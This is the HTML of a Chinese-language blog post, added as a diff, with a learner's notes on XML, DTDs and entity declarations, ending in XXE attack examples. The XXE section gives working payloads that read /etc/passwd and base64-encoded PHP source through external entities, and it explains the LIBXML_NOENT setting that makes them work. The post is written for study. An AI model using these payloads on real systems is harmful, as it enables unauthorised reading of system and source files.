@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/banana-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/banana-16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/yellow/pace-theme-material.css">
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"dickfql.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="title: 学习XXEdate: 2022-01-07 16:57:18categroies: #分类  web xmltags: #分类 xxe  最近两天在学习XXE攻击，顺便就把xml学习了一下，正好做一下笔记。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="小付的新♂日♂暮♂里">
+<meta property="og:url" content="https://dickfql.github.io/2022/01/07/%E5%AD%A6%E4%B9%A0XXE/index.html">
+<meta property="og:site_name" content="小付的新♂日♂暮♂里">
+<meta property="og:description" content="title: 学习XXEdate: 2022-01-07 16:57:18categroies: #分类  web xmltags: #分类 xxe  最近两天在学习XXE攻击，顺便就把xml学习了一下，正好做一下笔记。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-01-07T08:57:18.471Z">
+<meta property="article:modified_time" content="2022-01-08T02:50:09.390Z">
+<meta property="article:author" content="Fantasy♂Fu♂">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://dickfql.github.io/2022/01/07/%E5%AD%A6%E4%B9%A0XXE/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://dickfql.github.io/2022/01/07/%E5%AD%A6%E4%B9%A0XXE/","path":"2022/01/07/学习XXE/","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title> | 小付的新♂日♂暮♂里</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/rss2.xml" title="小付的新♂日♂暮♂里" type="application/rss+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">小付的新♂日♂暮♂里</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Fantasy</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+        <li class="menu-item menu-item-resources"><a href="/resources/" rel="section"><i class="fab fa-internet-explorer fa-fw"></i>资源</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+	
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+
+<!--网易云-->
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=526698913&auto=1&height=66"></iframe>
+
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFXML%EF%BC%9F"><span class="nav-number">1.</span> <span class="nav-text">什么是XML？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XML%E6%9C%89%E4%BB%80%E4%B9%88%E7%94%A8%EF%BC%9F"><span class="nav-number">2.</span> <span class="nav-text">XML有什么用？</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XML-%E6%8A%8A%E6%95%B0%E6%8D%AE%E4%BB%8E-HTML-%E5%88%86%E7%A6%BB"><span class="nav-number">2.1.</span> <span class="nav-text">XML 把数据从 HTML 分离</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XML-%E4%B8%8E-HTML-%E7%9A%84%E4%B8%BB%E8%A6%81%E5%B7%AE%E5%BC%82"><span class="nav-number">3.</span> <span class="nav-text">XML 与 HTML 的主要差异</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DOCTYPE-%E5%A3%B0%E6%98%8E%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">DOCTYPE 声明：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E9%83%A8-DOCTYPE-%E5%A3%B0%E6%98%8E%EF%BC%9A"><span class="nav-number">4.1.</span> <span class="nav-text">内部 DOCTYPE 声明：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%96%E9%83%A8DOCTYPE-%E6%96%87%E6%A1%A3%E5%A3%B0%E6%98%8E%EF%BC%9A"><span class="nav-number">4.2.</span> <span class="nav-text">外部DOCTYPE 文档声明：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%83%E7%B4%A0%E5%A3%B0%E6%98%8E%EF%BC%9A"><span class="nav-number">5.</span> <span class="nav-text">元素声明：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%9E%E4%BD%93%E5%A3%B0%E6%98%8E%EF%BC%9A"><span class="nav-number">6.</span> <span class="nav-text">实体声明：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BB%B6%E7%94%B3%EF%BC%9A"><span class="nav-number">7.</span> <span class="nav-text">延申：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PCDATA"><span class="nav-number">7.1.</span> <span class="nav-text">PCDATA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CDATA"><span class="nav-number">7.2.</span> <span class="nav-text">CDATA</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XXE"><span class="nav-number">8.</span> <span class="nav-text">XXE:</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%94%BB%E5%87%BB%E4%BC%9A%E6%88%90%E5%8A%9F%EF%BC%9F"><span class="nav-number">9.</span> <span class="nav-text">为什么攻击会成功？</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Fantasy♂Fu♂"
+      src="/images/banana.jpg">
+  <p class="site-author-name" itemprop="name">Fantasy♂Fu♂</p>
+  <div class="site-description" itemprop="description">振兴哲♂学，Ass ♂ We ♂ Can!.</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/dickfql" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;dickfql" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://dickfql.github.io/2022/01/07/%E5%AD%A6%E4%B9%A0XXE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/banana.jpg">
+      <meta itemprop="name" content="Fantasy♂Fu♂">
+      <meta itemprop="description" content="振兴哲♂学，Ass ♂ We ♂ Can!.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小付的新♂日♂暮♂里">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2022-01-07 16:57:18" itemprop="dateCreated datePublished" datetime="2022-01-07T16:57:18+08:00">2022-01-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-01-08 10:50:09" itemprop="dateModified" datetime="2022-01-08T10:50:09+08:00">2022-01-08</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>title: 学习XXE<br>date: 2022-01-07 16:57:18<br>categroies: #分类</p>
+<ul>
+<li>web</li>
+<li>xml<br>tags: #分类</li>
+<li>xxe</li>
+</ul>
+<p>最近两天在学习XXE攻击，顺便就把xml学习了一下，正好做一下笔记。</p>
+<span id="more"></span>
+
+<p>​        XXE：XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。例如PHP中的’’simplexml_load’’默认情况下会解析外部实体，有XXE漏洞的标志性函数为simplexml_load_string（）。</p>
+<p>​        要搞懂XXE，就得先学习一下xml。xml我在<a target="_blank" rel="noopener" href="https://www.w3school.com.cn/xml/index.asp">W3C</a>上简要的理解了下。</p>
+<h1 id="什么是XML？"><a href="#什么是XML？" class="headerlink" title="什么是XML？"></a>什么是XML？</h1><ul>
+<li>XML 指可扩展标记语言（<em>EX</em>tensible <em>M</em>arkup <em>L</em>anguage）</li>
+<li>XML 是一种<em>标记语言</em>，很类似 HTML</li>
+<li>XML 的设计宗旨是<em>传输数据</em>，而非显示数据</li>
+<li>XML 标签没有被预定义。您需要<em>自行定义标签</em>。</li>
+<li>XML 被设计为具有<em>自我描述性</em>。</li>
+</ul>
+<h1 id="XML有什么用？"><a href="#XML有什么用？" class="headerlink" title="XML有什么用？"></a>XML有什么用？</h1><p><strong>XML 应用于 web 开发的许多方面，常用于简化数据的存储和共享。</strong></p>
+<h2 id="XML-把数据从-HTML-分离"><a href="#XML-把数据从-HTML-分离" class="headerlink" title="XML 把数据从 HTML 分离"></a>XML 把数据从 HTML 分离</h2><p>如果你需要在 HTML 文档中显示动态数据，那么每当数据改变时将花费大量的时间来编辑 HTML。</p>
+<p>通过 XML，数据能够存储在独立的 XML 文件中。这样你就可以专注于使用 HTML 进行布局和显示，并确保修改底层数据不再需要对 HTML 进行任何的改变。</p>
+<p>通过使用几行 JavaScript，你就可以读取一个外部 XML 文件，然后更新 HTML 中的数据内容。</p>
+<h1 id="XML-与-HTML-的主要差异"><a href="#XML-与-HTML-的主要差异" class="headerlink" title="XML 与 HTML 的主要差异"></a>XML 与 HTML 的主要差异</h1><ul>
+<li>XML 不是 HTML 的替代。</li>
+<li>XML 和 HTML 为不同的目的而设计：</li>
+<li>XML 被设计为传输和存储数据，其焦点是数据的内容。</li>
+<li>HTML 被设计用来显示数据，其焦点是数据的外观。</li>
+<li>HTML 旨在显示信息，而 XML 旨在传输信息。</li>
+</ul>
+<p>XML格式：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;??&gt;</span> </span><br><span class="line">//第一行是 XML 声明。           </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [								//定义此文档是 note 类型的文档。</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span>			//定义 note 元素有四个元素：&quot;to、from、heading,、body&quot;</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>      (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span> 												//DTD部分</span><br><span class="line">//————————————————————————————————————————————————————————————————————————————————   </span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>											//使用定义的标签</span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span>										//XML使用部分</span><br><span class="line">//————————————————————————————————————————————————————————————————————————————————</span><br></pre></td></tr></table></figure>
+
+<p>XML声明：很简单，<?xml version="1.0" encoding="utf-8"??> ，它定义 XML 的版本 (1.0) 和所使用的编码 (ISO-8859-1 = Latin-1/西欧字符集)。</p>
+<p>DTD部分：这部分可以理解为定义标签，然后再XML部分使用定义的标签。  </p>
+<p>XML部分：调用定义的标签</p>
+<h1 id="DOCTYPE-声明："><a href="#DOCTYPE-声明：" class="headerlink" title="DOCTYPE 声明："></a>DOCTYPE 声明：</h1><h2 id="内部-DOCTYPE-声明："><a href="#内部-DOCTYPE-声明：" class="headerlink" title="内部 DOCTYPE 声明："></a>内部 DOCTYPE 声明：</h2><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p>
+<p><code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
+<h2 id="外部DOCTYPE-文档声明："><a href="#外部DOCTYPE-文档声明：" class="headerlink" title="外部DOCTYPE 文档声明："></a>外部DOCTYPE 文档声明：</h2><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
+<p><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code></p>
+<p><strong>助于理解：这就好比是个标记，告诉计算机从这里开始（!DOCTYPE）是定义的部分，定义的东西如下。计算机看到（!DOCTYPE）后就知道这里是定义的东西，下面XML部分的内容要用到。定义起始用DOCTYPE，定义元素用ELEMENT，定义实体用ENTITY。</strong></p>
+<h1 id="元素声明："><a href="#元素声明：" class="headerlink" title="元素声明："></a>元素声明：</h1><p>普通元素：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT 元素名称 类别&gt;	或者	&lt;!ELEMENT 元素名称 (元素内容)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>空元素：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT 元素名称 EMPTY&gt;	或者	&lt;!ELEMENT br EMPTY&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其余元素不介绍了，可以自行了解。</p>
+<h1 id="实体声明："><a href="#实体声明：" class="headerlink" title="实体声明："></a>实体声明：</h1><p>内部实体：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENT0TY 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">例如：</span><br><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>外部实体：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br><span class="line">例如：</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">//漏洞关键,定义外部实体别忘加SYSTEM</span><br></pre></td></tr></table></figure>
+
+<p><strong>注释:</strong> 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。如：&writer;、&xxe;</p>
+<h1 id="延申："><a href="#延申：" class="headerlink" title="延申："></a>延申：</h1><h2 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h2><p>PCDATA 的意思是被解析的字符数据（parsed character data）。</p>
+<p>可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。</p>
+<p><strong>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</strong></p>
+<p>助于理解：意思是使用’&lt;’符号的时候，需要写成实体形：&amp; l t ; （去掉中间的空格）</p>
+<h2 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h2><p>CDATA 的意思是字符数据（character data）。</p>
+<p><strong>CDATA 是不会被解析器解析的文本。</strong>在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。</p>
+<p><em><strong>总结：综上学完可以基本了解了XML的东西，也能理解XXE。</strong></em></p>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE:"></a>XXE:</h1><p>在外部实体中加入恶意代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [ &lt;!ENTITY xxe &quot;test&quot;&gt; ] &gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+<p>回显：test（普通的调用外部实体）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/read=convert.base64-encode/resource=xxe.php&quot;&gt; ] &gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
+
+<p>回显：文件xxe.php的base64的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ] &gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure>
+
+<p>回显：Linux系统下的/etc/passwd文件信息</p>
+<h1 id="为什么攻击会成功？"><a href="#为什么攻击会成功？" class="headerlink" title="为什么攻击会成功？"></a>为什么攻击会成功？</h1><p>1、php打开了外部实体解析</p>
+<p>代码中$data = @simplexml_load_string($xml,’SimpleXMLElement’,LIBXML_NOENT);</p>
+<p>而LIBXML_NOENT参数开启了外部实体解析，libxml2.9.1及以后，默认不解析外部实体。当XML声明中stand_alone值是yes的时候表示DTD仅用于验证文档结构，外部实体将被禁用。但它的默认值是no，而且有些parser会直接忽略这一项。</p>
+<p>2、外部实体含有恶意代码</p>
+<p>本来外部实体用于引用外部的.dtd文件，用文件里面定义好的标签。但是外部实体使用了恶意代码如：”file:///etc/passwd”、”php://filter/read=convert.base64-encode/resource=xxe.php”，导致文件被任意读取。</p>
+<link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Fantasy♂Fu♂
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://dickfql.github.io/2022/01/07/%E5%AD%A6%E4%B9%A0XXE/" title="">https://dickfql.github.io/2022/01/07/学习XXE/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class="fa fa-rss"></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/01/06/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="prev" title="信息收集">
+                  <i class="fa fa-chevron-left"></i> 信息收集
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2021-10 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Fantasy♂Fu♂</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+      <span>站点总字数：</span>
+    <span title="站点总字数">7k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span>站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">6 分钟</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"width":200,"height":350,"position":"right","hOffset":0,"vOffset":10},"mobile":{"show":false},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
